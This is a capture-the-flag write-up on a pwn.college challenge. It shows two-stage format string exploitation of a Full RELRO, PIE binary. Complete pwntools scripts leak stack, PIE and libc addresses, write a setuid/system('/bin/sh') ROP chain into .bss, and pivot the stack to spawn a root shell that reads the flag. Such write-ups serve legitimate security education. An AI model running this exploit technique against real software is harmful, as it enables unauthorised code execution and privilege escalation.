---
title: "Format String Attack - Format String Attack Twice (Full RELRO + PIE)"
description: "Two-stage format string exploitation on babyfmt_level11.0 with Full RELRO + PIE: leaking PIE/libc, staging ROP in .bss, and stack pivot via saved return address."
author: "İsmail BOZKURT"
date: 2025-08-23
tags:
  - binary-exploitation
  - format-string-attack
  - rop
  - ret2libc
  - pie
  - relro
  - cet
  - pwn
  - CTF
categories:
  - Exploitation
  - Pwn
  - Format-String-Attack
---

# Format String Attack - Format String Attack Twice (Full RELRO + PIE)


Simple and quick PoC. Same approach used in [Format String Attack Once (Partial RELRO + no PIE)](/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/)

Nothing different than previous post.
## babyfmt_level11.0

```css
root@b0cae43b352f:/host# checksec ./babyfmt_level11.0
[*] '/host/babyfmt_level11.0'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```


### Leak Addresses

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--libc=./libc.so.6' ./babyfmt_level11.0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babyfmt_level11.0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
brva 0x16ab
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


def send_fmt(payload):
    io.sendafter(b'your input and then exit.\n', payload)

io = start()


###################################
######## Leak Part ################
###################################

payload = flat('%184$lx|%185$lx|%195$lx')
io.sendafter(b'your input again.\n', payload)

io.recvuntil(b'input is:')
io.recvline()

leaked = io.recvline().strip().split(b'|')

rbp_leak    = int(leaked[0], 16) - 0x50 ## 0x50 bytes before leaked address
exe.address = int(leaked[1], 16) - 0x184b
libc.address= int(leaked[2], 16) - 0x24083

success(f'RBP Addr      : {rbp_leak:#x}')
success(f'PIE Base Addr : {exe.address:#x}')
success(f'LIBC Base Addr: {libc.address:#x}')
success(f'BSS Address   : {exe.bss():#x}')

target_addr = exe.bss()+0xde0
success(f'Target Address: {target_addr:#x}')


###################################
######## rop chain write ##########
###################################



###################################
######## redirect code exec #######
###################################


io.interactive()
```


**The Result:**

```css
[+] Starting local process '/usr/bin/gdbserver': pid 496
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/host/babyfmt_level11.0_remotelibc', '-x', '/tmp/pwnlib-gdbscript-xj8nmj9y.gdb']
/host/exploit.py:68: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat('%184$lx|%185$lx|%195$lx')
[+] RBP Addr      : 0x7ffe6ad4c7e0
[+] PIE Base Addr : 0x55ce64d25000
[+] LIBC Base Addr: 0x7f417cc00000
[+] BSS Address   : 0x55ce64d29020
[+] Target Address: 0x55ce64d29e00
```

### find offset and padlen values


```css
[+] Receiving all data: Done (111B)
[*] Process '/host/babyfmt_level11.0' stopped with exit code 0 (pid 296)
[DEBUG] Received 0x6f bytes:
    b'Here is the result:\n'
    b'Your input is:                              \n'
    b'aaaabaaacaaadaaaeaaaSTART0x6161636161616261END'
[*] Found format string offset: 58
[+] User input starts at  : 58
[+] Needed pads           :3
[+] Numbwritten           :0
```

### get_flag.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--libc=./libc.so.6' ./babyfmt_level11.0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './babyfmt_level11.0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
brva 0x16a6
continue
si
nextret
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


def send_fmt(payload):
    io.sendafter(b'your input and then exit.\n', payload)

io = start()


###################################
######## Leak Part ################
###################################

payload = flat('%184$p|%185$p|%195$p')
io.sendafter(b'your input again.\n', payload)

io.recvuntil(b'input is:')
io.recvline()

leaked = io.recvline().strip().split(b'|')

rbp_leak    = int(leaked[0], 16) - 0x50 ## 0x50 bytes before leaked address
exe.address = int(leaked[1], 16) - 0x184b
libc.address= int(leaked[2], 16) - 0x24083

success(f'RBP Addr      : {rbp_leak:#x}')
success(f'PIE Base Addr : {exe.address:#x}')
success(f'LIBC Base Addr: {libc.address:#x}')
success(f'BSS Address   : {exe.bss():#x}')

target_addr = exe.bss()+0xde0
success(f'Target Address: {target_addr:#x}')
#==========================================#
#========= FmtStr Object ==================#
#==========================================#
offset = 58
padlen = 3

f = FmtStr(send_fmt, offset=58, padlen=3, numbwritten=0x2d)


###################################
######## rop chain write ##########
###################################
rop = ROP([exe, libc])

binsh   = next(libc.search(b'/bin/sh\0'))
ret     = rop.find_gadget(['ret'])[0]

rop.call('setuid', [0])
rop.raw(ret)
rop.call(libc.sym.system, [binsh])

for idx, c in enumerate(rop.build()):
    f.write(target_addr+(8*idx), c)

###################################
######## redirect code exec #######
###################################
pop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]

printf_saved_ret  = rbp_leak - 0x598
printf_saved_ret8 = rbp_leak - 0x590

f.write(printf_saved_ret, pop_rsp)
f.write(printf_saved_ret8, target_addr)

f.execute_writes()

io.interactive()

```


**The result:**

```css
[+] Starting local process '/host/babyfmt_level11.0_remotelibc': pid 735
/host/exploit.py:68: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat('%184$p|%185$p|%195$p')
[+] RBP Addr      : 0x7fff0beeba90
[+] PIE Base Addr : 0x55e273855000
[+] LIBC Base Addr: 0x7f32942a2000
[+] BSS Address   : 0x55e273859020
[+] Target Address: 0x55e273859e00
[*] Loaded 19 cached gadgets for '/host/babyfmt_level11.0_remotelibc'
[*] Loaded 195 cached gadgets for '/root/.cache/.pwntools-cache-3.12/libcdb_libs/5792732f783158c66fb4f3756458ca24e46e827d/libc-2.31.so'
[*] Switching to interactive mode
Here is the result:
Your input is:                              
efy                               #                \x00                             \x97                \x14   Y                                        \x00     \x9d                              \x00                             \x00                         \x00                                                                                                    \x00     \x00              \x00                                                                             \x00                             \x00                                              \x00ccc     \         \x00ccc               _          \x80    \xf8ccc          t           \x8a                                                                                                                                \xc4         \xa0            \x00                     H    D                                  \x00                             \xa0           \x00     \x00              p         \xc1                                                                   _\x10\x9e\x85s\xe2U$  
$ 
$ cat /flag
pwn.college{01eD**********************************EzW}
```

## References

Format string exploitation tutorial
[Format String Exploitation (Shellphish)](https://shellphish.net/tut/formatstrings.pdf)

Pwntools documentation (ROP, fmtstr_payload, primitives)
[Pwntools Documentation](https://docs.pwntools.com/en/stable/)

PLT/GOT, relocations, late binding explained
[Dynamic Linking and the GOT/PLT](https://outflux.net/blog/archives/2014/01/27/fun-with-pltgot/)

ret2libc overview and calling conventions recap
[System V AMD64 ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf)

PIE & RELRO behavior and impact on exploits
[RELRO (Partial vs Full) and GOT overwrites](https://access.redhat.com/blogs/766093/posts/1975793)

Intel CET overview (IBT/endbr64, SHSTK)
[Linux Shadow Stack (SHSTK) & IBT](https://lwn.net/Articles/793253/)

Using pwntools ROP helpers (chain building, gadgets)
[Pwntools ROP API docs](https://docs.pwntools.com/en/stable/rop/rop.html)

SROP helper and SigreturnFrame (if gadgets are scarce)
[Pwntools SROP helper docs](https://docs.pwntools.com/en/stable/rop/srop.html)

Practical write-up on GOT/PLT for pwning
[All about the GOT (ELF internals)](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

GDB tips (pwndbg) for inspecting stacks/sections
[pwndbg Documentation](https://pwndbg.re/)
